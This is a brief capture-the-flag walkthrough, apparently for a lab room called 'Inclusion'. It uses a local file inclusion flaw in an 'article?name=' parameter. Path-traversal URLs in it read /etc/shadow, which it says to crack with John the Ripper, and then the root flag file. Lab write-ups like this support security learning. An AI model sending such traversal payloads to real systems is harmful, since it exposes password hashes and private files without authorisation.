# Inclusion

- Enumeration

    Nmap Scan

    ![Inclusion%20b6d8e18de58b4bef8c2a40ce930fe1de/Untitled.png](Inclusion%20b6d8e18de58b4bef8c2a40ce930fe1de/Untitled.png)

- LFI

    This room have [LFI](https://www.notion.so/LFI-c7b0fd7319234fea9db9b34979003f4f) Vulneribility

    So you can just do this:

    http://10.10.66.6/article?name=../../../etc/shadow

    ![Inclusion%20b6d8e18de58b4bef8c2a40ce930fe1de/Untitled%201.png](Inclusion%20b6d8e18de58b4bef8c2a40ce930fe1de/Untitled%201.png)

    Now use the hash and crack it using [john](https://www.notion.so/John-the-Ripper-db1063d54bb74d288cc07463d6afc720)

- Getting Root Flag

    Using the LFI Vulnerability to get the root Flag

    http://10.10.66.6/article?name=../../../root/root.txt](http://10.10.66.6/article?name=../../../root/root.txt

    ![Inclusion%20b6d8e18de58b4bef8c2a40ce930fe1de/Untitled%202.png](Inclusion%20b6d8e18de58b4bef8c2a40ce930fe1de/Untitled%202.png)